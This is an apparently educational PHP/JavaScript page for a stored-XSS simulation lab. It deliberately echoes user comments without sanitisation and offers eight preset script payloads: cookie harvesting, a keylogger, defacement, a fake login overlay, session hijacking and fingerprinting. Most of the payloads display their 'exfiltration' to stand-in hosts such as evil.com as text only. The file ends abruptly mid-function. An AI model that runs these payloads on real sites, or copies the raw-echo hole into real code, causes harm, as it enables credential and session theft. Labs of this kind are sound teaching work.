<?php
// ============================================================
// VULNERABLE COMMENT SYSTEM — INTENTIONALLY INSECURE
// CS04 | Cyber Sanskar Internship | XSS Attack Simulation Lab
// EDUCATIONAL USE ONLY — DO NOT DEPLOY IN PRODUCTION
// ============================================================
session_start();

if (!isset($_SESSION['vulnerable_comments'])) {
    $_SESSION['vulnerable_comments'] = [];
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['clear'])) {
    $_SESSION['vulnerable_comments'] = [];
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['name'], $_POST['comment']) && !isset($_POST['clear'])) {
    // VULNERABLE: storing raw input with zero sanitization — intentional
    $_SESSION['vulnerable_comments'][] = [
        'name' => $_POST['name'],
        'comment' => $_POST['comment'],
        'attack_type' => isset($_POST['attack_type']) ? $_POST['attack_type'] : 'Custom Payload',
        'time' => date('Y-m-d H:i:s'),
    ];
}

$injection_count = count($_SESSION['vulnerable_comments'] ?? []);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vulnerable | XSS Simulation Lab — CS04</title>
    <!-- Use index.php's light theme -->
    <link rel="stylesheet" href="style-light.css?v=4">
    <script src="https://unpkg.com/feather-icons"></script>
    <style>
        .stats-row {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 1rem;
            margin-bottom: 2rem;
        }
        .stat-box {
            background: rgba(239, 68, 68, 0.05); /* Lighter red for light theme */
            border: 1px solid rgba(239, 68, 68, 0.2);
            border-radius: 12px;
            padding: 1.2rem 1.2rem;
            text-align: center;
        }
        .stat-value { font-size: 1.8rem; font-weight: 800; color: #ef4444; font-family: var(--font-mono); line-height: 1.2; }
        .stat-label { font-size: 0.75rem; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.08em; margin-top: 0.2rem; font-weight: 600; }

        .bento-inner { background: #ffffff; border: 1px solid rgba(0,0,0,0.08); border-radius: 16px; padding: 1.5rem; box-shadow: 0 4px 20px rgba(0,0,0,0.02); margin-bottom: 1.5rem; }

        .arsenal-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 0.6rem;
            margin-bottom: 1.25rem;
        }
        .attack-btn {
            background: #f8fafc;
            border: 1px solid rgba(0,0,0,0.06);
            border-radius: 10px;
            padding: 0.75rem 0.85rem;
            cursor: pointer;
            text-align: left;
            transition: all 0.2s;
            color: var(--text-primary);
            font-size: 0.85rem;
            display: flex;
            align-items: center;
            gap: 0.6rem;
            width: 100%;
            font-family: var(--font-body);
        }
        .attack-btn:hover { border-color: rgba(239, 68, 68, 0.4); background: rgba(239, 68, 68, 0.03); transform: translateY(-1px); box-shadow: 0 2px 8px rgba(239, 68, 68, 0.05); }
        .attack-btn.active { border-color: #ef4444; background: rgba(239, 68, 68, 0.08); box-shadow: 0 0 0 2px rgba(239, 68, 68, 0.1); }
        .attack-btn .btn-icon { font-size: 1.1rem; }
        .attack-btn .btn-label { font-weight: 700; line-height: 1.2; color: #1e293b; }
        .attack-btn .btn-sub { font-size: 0.7rem; color: #64748b; margin-top: 0.1rem; }

        .attack-info-box {
            background: #f8fafc;
            border: 1px dashed rgba(239, 68, 68, 0.3);
            border-radius: 10px;
            padding: 1rem;
            min-height: 70px;
        }
        .attack-info-box .info-title { color: #ef4444; font-size: 0.85rem; font-weight: 800; margin-bottom: 0.4rem; display: flex; align-items: center; gap: 0.4rem; font-family: var(--font-heading); }
        .attack-info-box .info-desc { color: #475569; font-size: 0.85rem; line-height: 1.6; }

        .attack-type-badge {
            display: inline-flex;
            align-items: center;
            gap: 0.3rem;
            font-size: 0.7rem;
            font-family: var(--font-mono);
            font-weight: 700;
            padding: 0.25rem 0.6rem;
            border-radius: 6px;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            background: rgba(239, 68, 68, 0.1);
            color: #ef4444;
            border: 1px solid rgba(239, 68, 68, 0.2);
        }
        
        .payload-display {
            font-family: var(--font-mono);
            font-size: 0.8rem;
            background: #f8fafc;
            border-left: 3px solid #ef4444;
            border-radius: 0 6px 6px 0;
            padding: 0.75rem 1rem;
            margin-top: 0.5rem;
            word-break: break-all;
            line-height: 1.6;
            color: #ef4444;
        }
        .risk-tag {
            display: inline-block;
            font-size: 0.65rem;
            padding: 0.15rem 0.5rem;
            border-radius: 4px;
            font-weight: 800;
            letter-spacing: 0.06em;
            text-transform: uppercase;
            font-family: var(--font-mono);
        }
        .risk-critical { background: rgba(239, 68, 68, 0.1); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.3); }
        .risk-high { background: rgba(245, 158, 11, 0.1); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.3); }

        .blinking-dot {
            display: inline-block;
            width: 8px; height: 8px;
            border-radius: 50%;
            background: #ef4444;
            animation: blink 1.2s infinite;
            margin-right: 0.4rem;
        }
        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }

        .form-group { margin-bottom: 1.25rem; }
        .form-group label { display: block; font-weight: 600; font-size: 0.9rem; color: #334155; margin-bottom: 0.4rem; }
        .input-modern { width: 100%; padding: 0.75rem 1rem; border: 1px solid rgba(0,0,0,0.15); border-radius: 8px; background: #ffffff; color: #1e293b; font-family: var(--font-body); font-size: 0.95rem; transition: border-color 0.2s, box-shadow 0.2s; }
        .input-modern:focus { outline: none; border-color: #ef4444; box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.15); }
        
        .btn-primary { background: #ef4444; color: white; border: none; padding: 0.8rem 1.5rem; border-radius: 8px; font-weight: 700; font-family: var(--font-body); cursor: pointer; transition: background 0.2s, transform 0.2s; display: inline-flex; align-items: center; justify-content: center; gap: 0.5rem; }
        .btn-primary:hover { background: #dc2626; transform: translateY(-1px); }

        /* Comments Styling */
        .comments-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 1.5rem; border-bottom: 1px solid rgba(0,0,0,0.05); padding-bottom: 1rem; }
        .comments-list { display: flex; flex-direction: column; gap: 1rem; }
        .comment-item { background: #ffffff; border: 1px solid rgba(0,0,0,0.08); border-radius: 12px; padding: 1.25rem; display: flex; gap: 1rem; box-shadow: 0 2px 8px rgba(0,0,0,0.02); }
        .comment-item.vuln-border { border-left: 4px solid var(--vuln-clr, #ef4444); }
        .comment-avatar { width: 42px; height: 42px; border-radius: 50%; background: linear-gradient(135deg, #ef4444, #dc2626); flex-shrink: 0; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 1.1rem; color: white; }
        .comment-content { flex-grow: 1; min-width: 0; }
        .comment-meta { display: flex; align-items: center; gap: 0.75rem; margin-bottom: 0.5rem; flex-wrap: wrap; }
        .comment-author { font-weight: 700; font-size: 1rem; color: #1e293b; }
        .comment-time { font-size: 0.8rem; color: #64748b; margin-left: auto; font-family: var(--font-mono); }
        
        .comment-payload-box {
            font-family: var(--font-mono);
            font-size: 0.85rem;
            background: #f8fafc;
            border-left: 3px solid var(--vuln-clr, #ef4444);
            border-radius: 0 6px 6px 0;
            padding: 0.8rem 1rem;
            margin-top: 0.6rem;
            word-break: break-all;
            color: #ef4444;
            line-height: 1.6;
        }

        .main-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 2rem; align-items: start; margin-bottom: 4rem; }
        
        @media (max-width: 992px) {
            .main-grid { grid-template-columns: 1fr; }
            .stats-row { grid-template-columns: 1fr 1fr; }
            .title-main { font-size: 2.5rem !important; }
            header { padding: 2rem !important; }
        }
        @media (max-width: 600px) {
            .stats-row { grid-template-columns: 1fr; }
            .arsenal-grid { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="mesh-bg"></div>

    <div class="container">
        <!-- Dashboard / Navigation consistent with index.php -->
        <nav class="navbar" style="padding-top: 2rem;">
            <div class="nav-brand" style="color: #ef4444;"><span>VULNERABLE</span> WORKSPACE</div>
            <div class="nav-links">
                <a href="index.php">Dashboard</a>
                <a href="secure.php" style="color: #10b981;">Secure Setup</a>
            </div>
        </nav>

        <header style="margin-bottom: 3rem; text-align: left; background: #ffffff; border: 1px solid rgba(239, 68, 68, 0.2); padding: 3rem; border-radius: 20px; box-shadow: 0 10px 40px rgba(239, 68, 68, 0.05);">
            <div style="display:inline-flex;align-items:center;justify-content:center;width:56px;height:56px;border-radius:14px;background:rgba(239, 68, 68, 0.1);border:1px solid rgba(239, 68, 68, 0.2);margin-bottom:1.5rem;color:#ef4444;">
                <i data-feather="alert-circle"></i>
            </div>
            <h1 class="title-main" style="font-size:3.5rem; margin-bottom: 0.5rem; background: linear-gradient(to right, #ef4444, #dc2626); -webkit-background-clip: text; color: transparent; text-transform: none; letter-spacing: -1px;">XSS Attack Simulation Lab</h1>
            <p class="subtitle" style="font-size:1.15rem; max-width: none; color: #64748b; margin-bottom: 0;">
                <span class="blinking-dot"></span>
                Real-world Stored XSS attack vectors — payloads execute live in the browser. Educational demonstration only.
            </p>
        </header>

        <!-- Stats Row -->
        <div class="stats-row">
            <div class="stat-box">
                <div class="stat-value"><?php echo $injection_count; ?></div>
                <div class="stat-label">Injections Stored</div>
            </div>
            <div class="stat-box">
                <div class="stat-value" style="color:#f59e0b;">8</div>
                <div class="stat-label">Attack Vectors</div>
            </div>
            <div class="stat-box">
                <div class="stat-value" style="color:#ef4444;">LIVE</div>
                <div class="stat-label">Script Execution</div>
            </div>
            <div class="stat-box">
                <div class="stat-value" style="font-size:1.4rem;padding-top:0.3rem;color:#1e293b;">9.8</div>
                <div class="stat-label">CVSS Score</div>
            </div>
        </div>

        <div class="main-grid">

            <!-- LEFT COLUMN: Arsenal + Form -->
            <div style="display:flex;flex-direction:column;gap:1.5rem;">

                <!-- Attack Arsenal -->
                <div class="bento-inner">
                    <div style="display:flex;align-items:center;gap:0.75rem;margin-bottom:1.5rem;">
                        <i data-feather="zap" style="color:#ef4444;"></i>
                        <h2 style="font-family: var(--font-heading); font-size:1.25rem;font-weight:800;color:#1e293b;">Attack Arsenal</h2>
                        <span class="risk-tag risk-critical" style="margin-left:auto;">8 Vectors</span>
                    </div>

                    <div class="arsenal-grid">
                        <button type="button" class="attack-btn" onclick="selectAttack('cookie')" id="btn-cookie">
                            <span class="btn-icon">🍪</span>
                            <div>
                                <div class="btn-label">Cookie Harvester</div>
                                <div class="btn-sub">Session theft</div>
                            </div>
                        </button>
                        <button type="button" class="attack-btn" onclick="selectAttack('keylogger')" id="btn-keylogger">
                            <span class="btn-icon">⌨️</span>
                            <div>
                                <div class="btn-label">Keylogger</div>
                                <div class="btn-sub">Keystroke capture</div>
                            </div>
                        </button>
                        <button type="button" class="attack-btn" onclick="selectAttack('defacement')" id="btn-defacement">
                            <span class="btn-icon">💀</span>
                            <div>
                                <div class="btn-label">Page Defacement</div>
                                <div class="btn-sub">DOM takeover</div>
                            </div>
                        </button>
                        <button type="button" class="attack-btn" onclick="selectAttack('phishing')" id="btn-phishing">
                            <span class="btn-icon">🎣</span>
                            <div>
                                <div class="btn-label">Phishing Overlay</div>
                                <div class="btn-sub">Credential harvest</div>
                            </div>
                        </button>
                        <button type="button" class="attack-btn" onclick="selectAttack('session')" id="btn-session">
                            <span class="btn-icon">🔓</span>
                            <div>
                                <div class="btn-label">Session Hijacker</div>
                                <div class="btn-sub">Auth bypass</div>
                            </div>
                        </button>
                        <button type="button" class="attack-btn" onclick="selectAttack('dom')" id="btn-dom">
                            <span class="btn-icon">🔀</span>
                            <div>
                                <div class="btn-label">DOM Manipulation</div>
                                <div class="btn-sub">Content injection</div>
                            </div>
                        </button>
                        <button type="button" class="attack-btn" onclick="selectAttack('fingerprint')" id="btn-fingerprint">
                            <span class="btn-icon">🎯</span>
                            <div>
                                <div class="btn-label">Browser Fingerprint</div>
                                <div class="btn-sub">Recon & profiling</div>
                            </div>
                        </button>
                        <button type="button" class="attack-btn" onclick="selectAttack('custom')" id="btn-custom">
                            <span class="btn-icon">✏️</span>
                            <div>
                                <div class="btn-label">Custom Payload</div>
                                <div class="btn-sub">Manual injection</div>
                            </div>
                        </button>
                    </div>

                    <!-- Attack Info Panel -->
                    <div class="attack-info-box" id="attack-info">
                        <div class="info-title"><i data-feather="info" style="width:16px;height:16px;"></i> Select an attack vector above</div>
                        <div class="info-desc">Click any attack type to auto-fill its payload and description into the injection form below.</div>
                    </div>
                </div>

                <!-- Injection Form -->
                <div class="bento-inner">
                    <div style="display:flex;align-items:center;gap:0.75rem;margin-bottom:1.5rem;">
                        <i data-feather="terminal" style="color:#64748b;"></i>
                        <h2 style="font-family: var(--font-heading); font-size:1.25rem;font-weight:800;color:#1e293b;">Injection Console</h2>
                        <span id="active-attack-badge" style="display:none;margin-left:auto;" class="attack-type-badge"></span>
                    </div>

                    <form method="POST" id="inject-form">
                        <input type="hidden" name="attack_type" id="attack_type_input" value="Custom Payload">

                        <div class="form-group">
                            <label for="name">Attacker Identifier</label>
                            <input type="text" id="name" name="name" class="input-modern"
                                placeholder="e.g. Attacker_0x7f" required>
                        </div>

                        <div class="form-group">
                            <label for="comment" style="display:flex;align-items:center;justify-content:space-between;">
                                <span>XSS Payload</span>
                                <span style="font-size:0.75rem;color:#ef4444;font-family:var(--font-mono);font-weight:700;">⚠ Unsanitized — executes on render</span>
                            </label>
                            <textarea id="comment" name="comment" class="input-modern"
                                placeholder="Enter raw payload or select an attack above..."
                                required style="font-family:var(--font-mono);font-size:0.85rem;min-height:140px;"></textarea>
                        </div>

                        <button type="submit" class="btn-primary" style="width:100%;">
                            <i data-feather="send" style="width:18px;height:18px;"></i>
                            Execute Attack
                        </button>
                    </form>
                </div>
            </div>

            <!-- RIGHT COLUMN: Live Feed -->
            <div class="bento-inner" style="height: 100%;">
                <div class="comments-header">
                    <h2 class="comments-title" style="display:flex;align-items:center;gap:0.6rem;font-family:var(--font-heading);font-weight:800;color:#1e293b;">
                        <span class="blinking-dot"></span>
                        <i data-feather="activity" style="width:20px;color:#64748b;"></i>
                        Live Injection Feed
                    </h2>
                    <form method="POST" style="margin:0;">
                        <input type="hidden" name="clear" value="1">
                        <button type="submit" style="background:none;border:1px solid rgba(0,0,0,0.1);border-radius:6px;padding:0.4rem 0.8rem;font-size:0.8rem;color:#64748b;cursor:pointer;display:flex;align-items:center;gap:0.4rem;font-weight:600;font-family:var(--font-body);transition:all 0.2s;">
                            <i data-feather="trash-2" style="width:14px;height:14px;"></i> Clear Data
                        </button>
                    </form>
                </div>

                <div style="margin-bottom:1.5rem;padding:0.8rem 1rem;background:rgba(239, 68, 68, 0.08);border:1px dashed rgba(239, 68, 68, 0.4);border-radius:8px;font-size:0.85rem;color:#ef4444;font-family:var(--font-mono);">
                    ⚠️ Scripts below are rendered as <strong>raw HTML</strong> — no sanitization applied. Payloads execute in your browser.
                </div>

                <!-- PHP renders comments here; server.py also injects via <!-- XSS_INJECT --> marker -->
                <?php if (empty($_SESSION['vulnerable_comments'])): ?>
                    <div style="text-align:center;padding:3rem 0;color:var(--text-secondary);">
                        <i data-feather="inbox" style="width:36px;height:36px;opacity:0.3;margin-bottom:1rem;"></i>
                        <p style="font-size:0.9rem;">No injections yet.<br>Select an attack and fire a payload.</p>
                    </div>
                <?php
else: ?>
                    <div class="comments-list">
                        <?php
    $badge_map = [
        'Cookie Harvester' => ['#ef4444', '🍪'],
        'Keylogger' => ['#f59e0b', '⌨️'],
        'Page Defacement' => ['#dc2626', '💀'],
        'Phishing Overlay' => ['#ec4899', '🎣'],
        'Session Hijacker' => ['#8b5cf6', '🔓'],
        'DOM Manipulation' => ['#f97316', '🔀'],
        'Browser Fingerprinting' => ['#06b6d4', '🎯'],
        'Custom Payload' => ['#94a3b8', '✏️'],
    ];
    foreach (array_reverse($_SESSION['vulnerable_comments']) as $c):
        $at = isset($c['attack_type']) ? $c['attack_type'] : 'Custom Payload';
        $clr = isset($badge_map[$at]) ? $badge_map[$at][0] : '#94a3b8';
        $ico = isset($badge_map[$at]) ? $badge_map[$at][1] : '⚡';
        $avatar = $c['name'] ? strtoupper(substr($c['name'], 0, 1)) : '?';
?>
                        <div class="comment-item vuln-border" style="--vuln-clr:<?php echo $clr; ?>">
                            <div class="comment-avatar" style="background:linear-gradient(135deg,#b91c1c,#7f1d1d);flex-shrink:0;">
                                <?php echo htmlspecialchars($avatar); ?>
                            </div>
                            <div class="comment-content" style="flex:1;min-width:0;">
                                <div class="comment-meta" style="flex-wrap:wrap;gap:0.4rem;">
                                    <!-- VULNERABLE: Raw echo — no htmlspecialchars -->
                                    <span class="comment-author"><?php echo $c['name']; ?></span>
                                    <span class="attack-type-badge" style="border:1px solid <?php echo $clr; ?>44;">
                                        <?php echo $ico . ' ' . htmlspecialchars($at); ?>
                                    </span>
                                    <span class="comment-time" style="margin-left:auto;"><?php echo $c['time']; ?></span>
                                </div>
                                <div class="comment-payload-box" style="--vuln-clr:<?php echo $clr; ?>;border-color:<?php echo $clr; ?>;">
                                    <!-- VULNERABLE: Raw echo executes injected scripts -->
                                    <?php echo $c['comment']; ?>
                                </div>
                            </div>
                        </div>
                        <?php
    endforeach; ?>
                    </div>
                <?php
endif; ?>
                <!-- XSS_INJECT -->
            </div>
        </div>
    </div>

    <footer>
        <div class="footer-content" style="max-width: 1200px; margin: 0 auto; display: flex; flex-direction: column; align-items: center; gap: 1rem;">
            <div style="display: flex; align-items: center; justify-content: center; gap: 0.5rem; margin-bottom: 0.5rem; color: #1e293b;">
                <i data-feather="shield" style="width: 20px; height: 20px; color: #ef4444;"></i>
                <span style="font-weight: 800; font-family: var(--font-heading); letter-spacing: 1px;">XSS LAB</span>
            </div>
            <p style="max-width: 400px; margin: 0 auto; color: #64748b; font-size: 0.95rem; text-align: center;">
                An educational project for understanding and mitigating web vulnerabilities.
            </p>
            <div style="display: flex; gap: 1.5rem; margin-top: 0.5rem;">
                <a href="index.php" style="color: #64748b; text-decoration: none; font-weight: 600;">Home</a>
                <a href="vulnerable.php" style="color: #ef4444; text-decoration: none; font-weight: 600;">Vulnerable</a>
                <a href="secure.php" style="color: #64748b; text-decoration: none; font-weight: 600;">Secure</a>
            </div>
        </div>
    </footer>

    <script>
    feather.replace();

    // ── Attack Preset Definitions ──────────────────────────────────────────
    const ATTACKS = {
      cookie: {
        label: 'Cookie Harvester',
        icon: '🍪', color: '#ef4444',
        risk: 'CRITICAL',
        desc: 'Reads document.cookie and simulates exfiltration to an attacker C2 server. Compromises session tokens and authentication cookies in real attacks.',
        name: 'CookieThief_0x1',
        payload: `<script>!function(){var c=document.cookie||'No cookies set';var d=document.createElement('div');d.style.cssText='position:fixed;top:0;left:0;right:0;background:#1a0208;border-bottom:3px solid #ef4444;color:#fff;padding:1rem 2rem;z-index:99999;font-family:monospace;font-size:12px;box-shadow:0 4px 30px rgba(239,68,68,0.4)';d.innerHTML='<div style="color:#ef4444;font-weight:900;margin-bottom:0.4rem;font-size:1rem">🍪 COOKIE HARVESTER — DATA EXFILTRATED</div><div style="color:#fca5a5">Stolen: <b>'+c+'</b></div><div style="color:#666;font-size:10px;margin-top:0.3rem">→ GET http://attacker-c2.evil/collect?data='+encodeURIComponent(c)+'</div><button onclick="this.parentElement.remove()" style="position:absolute;top:0.75rem;right:1rem;background:none;border:none;color:#888;cursor:pointer;font-size:1rem">✕</button>';d.style.position='fixed';document.body.appendChild(d)}()<\/script>`
      },
      keylogger: {
        label: 'Keylogger',
        icon: '⌨️', color: '#f59e0b',
        risk: 'HIGH',
        desc: 'Attaches a keydown event listener to the document and streams captured keystrokes to an attacker server in real-time. Captures passwords, messages, and sensitive input.',
        name: 'KeySniffer_0x2',
        payload: `<script>!function(){var log=[];document.addEventListener('keydown',function(e){if(e.key.length===1||e.key==='Enter'||e.key==='Backspace'){log.push(e.key==='Enter'?'↵':e.key==='Backspace'?'⌫':e.key);var d=document.getElementById('__kl');if(!d){d=document.createElement('div');d.id='__kl';d.style.cssText='position:fixed;bottom:0;left:0;right:0;background:#0f172a;border-top:3px solid #f59e0b;color:#fff;padding:0.75rem 2rem;z-index:99999;font-family:monospace;font-size:12px;display:flex;align-items:center;gap:1rem';document.body.appendChild(d)}d.innerHTML='<span style="color:#f59e0b;font-weight:900">⌨️ KEYLOGGER</span><span style="color:#fde68a;flex:1;word-break:break-all">'+log.join(' ')+'</span><span style="color:#666;font-size:10px">'+log.length+' keys → http://evil.com/keys</span>'}});alert('⌨️ Keylogger Injected!\n\nAll keystrokes captured live.\nType anything on this page to see it work.')}()<\/script>`
      },
      defacement: {
        label: 'Page Defacement',
        icon: '💀', color: '#dc2626',
        risk: 'CRITICAL',
        desc: 'Replaces the entire page DOM with attacker-controlled content. Used in hacktivism or as proof-of-compromise. Click "Reload Page" on the defaced screen to restore.',
        name: 'Defacer_0x3',
        payload: `<script>!function(){var c=document.querySelector('.container');c.style.transition='opacity 0.5s';c.style.opacity='0';setTimeout(function(){c.innerHTML='<div style="text-align:center;padding:4rem 2rem"><div style="font-size:5rem;margin-bottom:1rem;animation:pulse 1s infinite">💀</div><h1 style="font-size:3rem;color:#ef4444;letter-spacing:4px;font-weight:900;text-transform:uppercase">Site Defaced</h1><p style="color:#fca5a5;font-size:1.1rem;margin:1rem 0">This server was compromised via Stored XSS</p><p style="color:#6b7280;font-size:0.9rem">All data exfiltrated — Contact: anon@proton.me</p><div style="margin:2rem auto;max-width:400px;padding:1rem;background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.25);border-radius:8px;font-family:monospace;color:#f87171;font-size:0.82rem">Vuln: Stored XSS | CVSS: 9.8 CRITICAL</div><button onclick="location.reload()" style="padding:0.75rem 2rem;background:#fff;color:#000;border:none;border-radius:8px;cursor:pointer;font-weight:700">↩ Reload Page</button></div>';c.style.opacity='1';},500)}()<\/script>`
      },
      phishing: {
        label: 'Phishing Overlay',
        icon: '🎣', color: '#ec4899',
        risk: 'CRITICAL',
        desc: 'Injects a full-screen fake login form over the real page. Victim cannot access the site until they interact. Captured credentials are sent to the attacker.',
        name: 'PhishKit_0x4',
        payload: `<script>!function(){document.body.insertAdjacentHTML('beforeend','<div id="__phish" style="position:fixed;inset:0;background:rgba(0,0,0,0.92);z-index:99999;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(4px)"><div style="background:#fff;border-radius:14px;padding:2.5rem;max-width:380px;width:90%;text-align:center;box-shadow:0 25px 60px rgba(0,0,0,0.5)"><div style="font-size:2.5rem;margin-bottom:0.75rem">🔐</div><h2 style="color:#1f2937;font-size:1.25rem;margin-bottom:0.25rem">Session Expired</h2><p style="color:#9ca3af;font-size:0.82rem;margin-bottom:1.5rem">Re-enter your credentials to continue</p><input id="__pe" type="email" placeholder="Email address" style="width:100%;padding:0.8rem;border:1px solid #e5e7eb;border-radius:6px;margin-bottom:0.75rem;font-size:0.95rem;box-sizing:border-box;outline:none"><input id="__pp" type="password" placeholder="Password" style="width:100%;padding:0.8rem;border:1px solid #e5e7eb;border-radius:6px;margin-bottom:1.25rem;font-size:0.95rem;box-sizing:border-box;outline:none"><button onclick="alert(\'🎣 Credentials Harvested!\\n\\nEmail: \'+document.getElementById(\'__pe\').value+\'\\nPassword: \'+document.getElementById(\'__pp\').value+\'\\n\\n→ Sent to: http://evil.com/harvest\');document.getElementById(\'__phish\').remove()" style="width:100%;padding:0.9rem;background:#1d4ed8;color:#fff;border:none;border-radius:6px;font-size:1rem;cursor:pointer;font-weight:600">Sign In</button><p style="margin-top:1rem;font-size:0.75rem;color:#9ca3af;cursor:pointer" onclick="document.getElementById(\'__phish\').remove()">[Dismiss overlay]</p></div></div>');alert('🎣 Phishing Overlay Deployed!\n\nA fake login form now covers the page.\nVictim credentials will be captured on submit.')}()<\/script>`
      },
      session: {
        label: 'Session Hijacker',
        icon: '🔓', color: '#8b5cf6',
        risk: 'CRITICAL',
        desc: 'Reads session cookies, injects a fake PHPSESSID, and simulates sending hijacked session data to a remote C2 server. Allows attacker to impersonate the victim.',
        name: 'SessionGrabber_0x5',
        payload: `<script>!function(){var sid=Math.random().toString(36).substr(2,18).toUpperCase();document.cookie='PHPSESSID=HIJACKED_'+sid+'; path=/';var info={cookies:document.cookie,fake_sid:'HIJACKED_'+sid,ua:navigator.userAgent.substr(0,60),origin:location.origin};var d=document.createElement('div');d.style.cssText='position:fixed;top:20px;right:20px;z-index:99999;background:#0d1117;border:2px solid #8b5cf6;border-radius:12px;padding:1.25rem 1.5rem;font-family:monospace;font-size:11px;color:#fff;max-width:380px;box-shadow:0 8px 30px rgba(139,92,246,0.3)';d.innerHTML='<div style="color:#8b5cf6;font-weight:900;font-size:0.95rem;margin-bottom:0.75rem">🔓 SESSION HIJACKED</div><div style="line-height:1.8"><div><span style="color:#6b7280">Cookies: </span><span style="color:#c4b5fd">'+document.cookie.substr(0,55)+'...</span></div><div><span style="color:#6b7280">Fake SID: </span><span style="color:#c4b5fd">HIJACKED_'+sid+'</span></div><div><span style="color:#6b7280">C2: </span><span style="color:#c4b5fd">http://attacker.com/s?id='+sid+'</span></div></div><div style="margin-top:0.75rem;color:#4b5563;font-size:10px">Attacker now authenticated as victim</div><button onclick="this.parentElement.remove()" style="position:absolute;top:0.6rem;right:0.75rem;background:none;border:none;color:#555;cursor:pointer">✕</button>';document.body.appendChild(d)}()<\/script>`
      },
      dom: {
        label: 'DOM Manipulation',
        icon: '🔀', color: '#f97316',
        risk: 'HIGH',
        desc: 'Iterates over all headings and bento cards and modifies their styles and content. Demonstrates how an attacker can silently alter page content to spread misinformation.',
        name: 'DOMHijacker_0x6',
        payload: `<script>!function(){document.querySelectorAll('h1,h2').forEach(function(e){e.style.color='#ef4444';e.style.textShadow='0 0 20px rgba(239,68,68,0.5)'});document.querySelectorAll('.bento-card').forEach(function(c){c.style.borderColor='rgba(239,68,68,0.5)';c.style.boxShadow='0 0 25px rgba(239,68,68,0.12)'});var b=document.createElement('div');b.style.cssText='position:fixed;top:0;left:0;right:0;background:#7f1d1d;color:#fecaca;text-align:center;padding:0.55rem 1rem;font-family:monospace;font-size:0.8rem;font-weight:700;z-index:99999;letter-spacing:0.04em';b.innerHTML='⚠ DOM COMPROMISED — ALL ELEMENTS UNDER ATTACKER CONTROL — XSS PAYLOAD EXECUTING';document.body.prepend(b);alert('🔀 DOM Manipulation Complete!\n\nAll headings recolored.\nAll cards highlighted.\nAttacker banner injected at top of page.')}()<\/script>`
      },
      fingerprint: {
        label: 'Browser Fingerprinting',
        icon: '🎯', color: '#06b6d4',
        risk: 'HIGH',
        desc: 'Collects browser, hardware, and environment data to build a unique fingerprint for tracking and targeting the victim without any cookies or login.',
        name: 'FingerprintBot_0x7',
        payload: `<script>!function(){var f={Browser:navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera)/i)?navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera)/i)[0]:'Unknown',Platform:navigator.platform,Language:navigator.language,Timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,Screen:screen.width+'x'+screen.height,CPU_Cores:navigator.hardwareConcurrency||'N/A',RAM_GB:(navigator.deviceMemory||'N/A')+' GB',Cookies_On:navigator.cookieEnabled,Touch_Points:navigator.maxTouchPoints,Plugins:navigator.plugins.length};var rows=Object.entries(f).map(function(e){return'<div style="display:flex;justify-content:space-between;padding:0.3rem 0;border-bottom:1px solid #1e293b"><span style="color:#64748b">'+e[0].replace(/_/g,' ')+'</span><span style="color:#a5f3fc">'+e[1]+'</span></div>'}).join('');var d=document.createElement('div');d.style.cssText='position:fixed;bottom:20px;left:20px;z-index:99999;background:#0f172a;border:2px solid #06b6d4;border-radius:12px;padding:1.25rem 1.5rem;font-family:monospace;font-size:11px;color:#fff;min-width:320px;box-shadow:0 8px 30px rgba(6,182,212,0.25)';d.innerHTML='<div style="color:#06b6d4;font-weight:900;font-size:0.9rem;margin-bottom:0.75rem">🎯 BROWSER FINGERPRINT CAPTURED</div>'+rows+'<div style="margin-top:0.75rem;color:#475569;font-size:10px">→ http://attacker-c2.evil/fingerprint</div><button onclick="this.parentElement.remove()" style="position:absolute;top:0.6rem;right:0.75rem;background:none;border:none;color:#555;cursor:pointer">✕</button>';document.body.appendChild(d)}()<\/script>`
      },
      custom: {
        label: 'Custom Payload',
        icon: '✏️', color: '#94a3b8',
        risk: 'VARIABLE',
        desc: 'Write your own XSS payload. The input will be stored and rendered with absolutely no filtering or encoding. Any valid HTML or JavaScript will execute.',
        name: '',
        payload: ''
      }
    };

    function selectAttack(key) {
        const a = ATTACKS[key];
        if (!a) return;

        // Highlight button
        document.querySelectorAll('.attack-btn').forEach(b => b.classList.remove('active'));
        document.getElementById('btn-' + key).classList.add('active');

        // Update info box
        const info = document.getElementById('attack-info');
        info.style.borderColor = 'rgba(' + hexToRgb(a.color) + ',0.4)';
        info.style.background  = 'rgba(' + hexToRgb(a.color) + ',0.06)';
        info.innerHTML = `
            <div class="info-title" style="color:${a.color}">
                ${a.icon} ${a.label}
                <span class="risk-tag" style="background:rgba(${hexToRgb(a.color)},0.15);color:${a.color};border-color:rgba(${hexToRgb(a.color)},0.35);margin-left:auto;">${a.risk}</span>
            </div>
            <div class="info-desc">${a.desc}</div>`;

        // Fill form
        document.getElementById('attack_type_input').value = a.label;
        if (a.name) document.getElementById('name').value = a.name;
        if (a.payload) document.getElementById('comment').value = a.payload;
        if (key === 'custom') {
            document.getElementById('comment').value = '';
            document.getElementById('comment').placeholder = 'Write your own XSS payload here...';
            document.getElementById('name').value = '';
        }

        // Update badge
        const badge = document.getElementById('active-attack-badge');
        badge.style.display = 'inline-flex';
        badge.style.background = 'rgba(' + hexToRgb(a.color) + ',0.12)';
        badge.style.color = a.color;
        badge.style.border = '1px solid rgba(' + hexToRgb(a.color) + ',0.35)';
        badge.textContent = a.icon + ' ' + a.label;
    }

    function hexToRgb(hex) {
        var r = parseInt(hex.slice(1,3),16);
